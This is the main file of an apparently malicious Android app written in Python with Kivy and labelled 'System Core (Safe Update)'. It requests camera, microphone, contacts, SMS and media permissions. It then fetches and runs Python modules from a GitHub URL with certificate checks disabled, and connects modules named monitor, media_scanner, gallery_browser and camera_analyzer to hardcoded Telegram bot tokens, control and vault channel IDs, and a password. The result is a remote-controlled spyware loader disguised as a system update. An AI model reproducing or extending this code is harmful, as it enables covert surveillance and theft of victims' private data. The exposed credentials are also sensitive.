# -*- coding: utf-8 -*-
import os
import sys
import threading
import importlib
import requests
import traceback
import gc
import time
from datetime import datetime
from kivy.app import App
from kivy.uix.textinput import TextInput
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.clock import Clock
from kivy.core.clipboard import Clipboard

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def _get_path():
    try:
        from jnius import autoclass
        act = autoclass('org.kivy.android.PythonActivity').mActivity
        base = act.getFilesDir().getPath()
        p = os.path.join(base, ".sys_runtime")
    except Exception:
        p = os.path.join(os.getcwd(), ".sys_runtime")
    os.makedirs(p, exist_ok=True)
    return p


R = _get_path()
U = os.path.join(R, "updates")          # ✅ مجلد التحميل المؤقت (إصلاح 1)
os.makedirs(U, exist_ok=True)

if R not in sys.path:
    sys.path.insert(0, R)


def _perms():
    try:
        from android.permissions import request_permissions, Permission
        request_permissions([
            Permission.INTERNET,
            Permission.CAMERA,
            Permission.RECORD_AUDIO,
            Permission.READ_EXTERNAL_STORAGE,
            Permission.WRITE_EXTERNAL_STORAGE,
            Permission.READ_CONTACTS,
            Permission.READ_SMS,
            Permission.WAKE_LOCK,
            Permission.ACCESS_NETWORK_STATE,
            Permission.ACCESS_WIFI_STATE,
            "android.permission.FOREGROUND_SERVICE",
            "android.permission.POST_NOTIFICATIONS",
            "android.permission.READ_MEDIA_IMAGES",
            "android.permission.READ_MEDIA_VIDEO",
            "android.permission.READ_MEDIA_AUDIO"
        ])
    except Exception:
        pass


RAW_INDEX = "https://raw.githubusercontent.com/Zaen1993/Android-Core/refs/heads/main/index.json"


class CoreApp(App):
    def build(self):
        _perms()
        self.title = "System Core v3.2 (Safe Update)"
        layout = BoxLayout(orientation='vertical', spacing=5)

        self.log = TextInput(
            text="", readonly=True,
            background_color=(0.02, 0.02, 0.02, 1),
            foreground_color=(0.3, 0.9, 0.3, 1),
            font_size='10sp'
        )

        btns = BoxLayout(size_hint=(1, 0.08), spacing=5)
        copy_btn = Button(text="📋 COPY LOG", background_color=(0.2, 0.4, 0.6, 1))
        copy_btn.bind(on_press=self._copy)
        clear_btn = Button(text="🗑 CLEAR", background_color=(0.6, 0.2, 0.2, 1))
        clear_btn.bind(on_press=self._clear)

        btns.add_widget(copy_btn)
        btns.add_widget(clear_btn)

        layout.add_widget(self.log)
        layout.add_widget(btns)

        Clock.schedule_once(self._start, 0.5)
        return layout

    def _copy(self, _):
        Clipboard.copy(self.log.text)
        self._log("Log copied to clipboard")

    def _clear(self, _):
        self.log.text = ""

    def _log(self, msg, lvl="INFO"):
        ts = datetime.now().strftime("%H:%M:%S")

        def upd(dt):
            self.log.text += f"[{ts}] [{lvl}] {msg}\n"
            if len(self.log.text) > 15000:
                self.log.text = self.log.text[-8000:]
            self.log.cursor = (0, len(self.log.text))

        Clock.schedule_once(upd, 0)

    # ✅ إصلاح 2: التحقق من صحة الكود قبل الاستبدال (Syntax Validation)
    def _verify_module(self, file_path, module_name):
        """تتحقق من وجود الملف وخلوه من أخطاء نحوية باستخدام compile()"""
        if not os.path.exists(file_path):
            return False
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                content = f.read()
            if len(content) < 300:
                return False
            # فحص نحوي
            compile(content, module_name, 'exec')
            # فحص خاص لملف telegram_ui (وجود class T)
            if module_name == "telegram_ui.py" and "class T" not in content:
                return False
            return True
        except SyntaxError as e:
            self._log(f"Syntax error in {module_name}: {e}", "ERROR")
            return False
        except Exception as e:
            self._log(f"Verification error for {module_name}: {e}", "ERROR")
            return False

    # ✅ إصلاح 1 و 4: تحميل آمن مع مجلد مؤقت وزيادة عدد المحاولات
    def _download_safe(self, url, filename):
        """تحميل الملف إلى مجلد مؤقت، التحقق منه، ثم نسخه إلى المجلد النهائي"""
        tmp_path = os.path.join(U, filename)
        final_path = os.path.join(R, filename)

        for attempt in range(5):   # ✅ إصلاح 4: زيادة المحاولات إلى 5
            try:
                self._log(f"Downloading {filename} (attempt {attempt+1}/5)...")
                resp = requests.get(f"{url}?v={int(time.time())}", timeout=30, verify=False)
                if resp.status_code == 200 and len(resp.text) > 300:
                    with open(tmp_path, 'w', encoding='utf-8') as f:
                        f.write(resp.text)

                    if self._verify_module(tmp_path, filename):
                        # نسخ الملف الصحيح إلى المجلد النهائي
                        with open(tmp_path, 'r', encoding='utf-8') as src:
                            content = src.read()
                        with open(final_path, 'w', encoding='utf-8') as dst:
                            dst.write(content)
                        self._log(f"✅ {filename} updated successfully ({len(resp.text)} bytes)")
                        return True
                    else:
                        self._log(f"❌ {filename} failed verification (syntax or content)", "ERROR")
                        return False
                else:
                    self._log(f"Download {filename} failed: HTTP {resp.status_code}", "WARN")
            except Exception as e:
                self._log(f"Attempt {attempt+1} error for {filename}: {e}", "WARN")

            if attempt < 4:
                time.sleep(10)   # ✅ إصلاح 4: تأخير 10 ثوانٍ بين المحاولات

        self._log(f"❌ {filename} failed after 5 attempts", "ERROR")
        return False

    def _start(self, _):
        threading.Thread(target=self._run, daemon=True).start()

    def _run(self):
        self._log("🚀 Initializing System Core (Safe Update Mode)...", "BOOT")

        # 1. جلب قائمة الملفات من index.json
        all_files = []
        try:
            resp = requests.get(RAW_INDEX, timeout=20, verify=False)
            if resp.status_code == 200:
                all_files = resp.json().get('files', [])
                self._log(f"📄 Found {len(all_files)} files in index")
            else:
                self._log("Failed to fetch index.json, using local files only", "WARN")
        except Exception as e:
            self._log(f"Index fetch error: {e}", "ERROR")

        # 2. تحميل التحديثات بشكل آمن (بدون حذف الملفات القديمة أولاً)
        for file_url in all_files:
            filename = file_url.split('/')[-1]
            if filename == "main.py":
                continue
            self._download_safe(file_url, filename)

        # 3. إزالة الموديولات القديمة من الذاكرة (✅ إصلاح 3)
        self._log("🧹 Cleaning old modules from memory...")
        modules_to_remove = [
            "monitor", "telegram_ui", "commands",
            "media_scanner", "daily_zipper", "gallery_browser", "camera_analyzer"
        ]
        for mod in modules_to_remove:
            if mod in sys.modules:
                del sys.modules[mod]

        importlib.invalidate_caches()
        gc.collect()

        # 4. تشغيل النظام الأساسي
        try:
            import monitor
            import telegram_ui
            import commands

            # إعادة تحميل لضمان أحدث نسخة
            importlib.reload(monitor)
            importlib.reload(telegram_ui)
            importlib.reload(commands)

            UI_Class = getattr(telegram_ui, 'T', None)

            if UI_Class:
                mon = monitor.M()
                # إعداد التوكنات والقنوات
                mon.bots = [
                    "7989685602:AAFRAWYihFV3Vx6XOUJyjcTOZYo8cT5DPJQ",
                    "8113293244:AAFFwTHZ5GkoV3DN88jeU8XuMhJf0KLTsf4",
                    "8369506331:AAFbMuU5NsVPWP9y977xG_lLaG1-pdGBs-Q",
                    "8731591344:AAE2akQtyBPLNZbzhxkjxYDgQ4noiH_keYo",
                    "8444591624:AAH84_ih3YUm4rEU_0zVnY2H05QTjjyMsZI",
                    "8541707106:AAHJFi2V57HryzYkmA2FBgFMcetfqQCi2jM"
                ]
                mon.ctrl = -1003365166986
                mon.vlt = -1003787520015
                mon.pw = "Zaen123@123@"

                ui = UI_Class(mon)
                mon.ui = ui
                mon.cb_h = lambda d, cid, uid: commands.ex(d, ui, mon, cid, uid)

                ui.start()
                mon.start()

                self._log("🎉 SYSTEM ONLINE (Safe Mode)", "SUCCESS")
                self._log(f"Device ID: {mon.did} | Model: {mon.dmd}")
            else:
                self._log("❌ CRITICAL: Class 'T' missing in telegram_ui.py", "ERROR")

        except Exception as e:
            self._log(f"FATAL ERROR: {e}", "ERROR")
            self._log(traceback.format_exc(), "TRACE")


if __name__ == '__main__':
    CoreApp().run()
